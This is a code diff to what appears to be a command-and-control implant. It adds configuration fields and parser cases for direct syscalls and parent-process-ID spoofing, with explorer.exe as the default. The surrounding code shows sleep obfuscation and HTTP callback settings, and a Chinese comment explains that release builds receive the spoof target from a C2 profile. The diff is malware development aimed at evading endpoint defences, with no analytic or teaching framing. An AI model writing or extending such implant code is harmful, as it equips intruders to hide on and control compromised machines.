@@ -22,6 +22,8 @@
 #define CFG_SLEEP_OBF_ENABLED 7u
 #define CFG_SLEEP_OBF_TECHNIQUE 8u
 #define CFG_SLEEP_IMAGE_LAYOUT 300u
+#define CFG_SYSCALL_ENABLED 310u
+#define CFG_SPAWN_PPID 311u
 #define CFG_HTTP_HOST 100u
 #define CFG_HTTP_PORT 101u
 #define CFG_HTTP_URI 102u
@@ -381,6 +383,12 @@ static INT ParseProfileTlv(Profile* p, const BYTE8* data, UINT32 data_len)
                 p->sleep_obf_technique = (SleepObfTechnique)value[0];
             }
             break;
+        case CFG_SYSCALL_ENABLED:
+            if (value_len > 0) p->syscall_enabled = value[0] != 0;
+            break;
+        case CFG_SPAWN_PPID:
+            CopyTlvString(p->spawn_ppid, sizeof(p->spawn_ppid), value, value_len);
+            break;
         case CFG_SLEEP_IMAGE_LAYOUT:
             ApplySleepImageLayout(p, value, value_len);
             break;
@@ -628,6 +636,10 @@ VOID ProfileLoad(Profile* p)
     p->sleep_ms = 5000;
     p->jitter = 20;
     p->conn_timeout_sec = 10;
+    p->syscall_enabled = TRUE;
+    /* Debug/本地构建默认启用 PPID 欺骗到 explorer.exe（可被 TSCF 配置覆盖；
+     * Release 模板由 c2profile beacon.spawn_ppid 下发）。 */
+    strcpy_s(p->spawn_ppid, sizeof(p->spawn_ppid), "explorer.exe");
     //p->sleep_obf_enabled = TRUE;
     p->sleep_obf_enabled = FALSE;
     p->sleep_obf_technique = SLEEP_OBF_GARGLE;
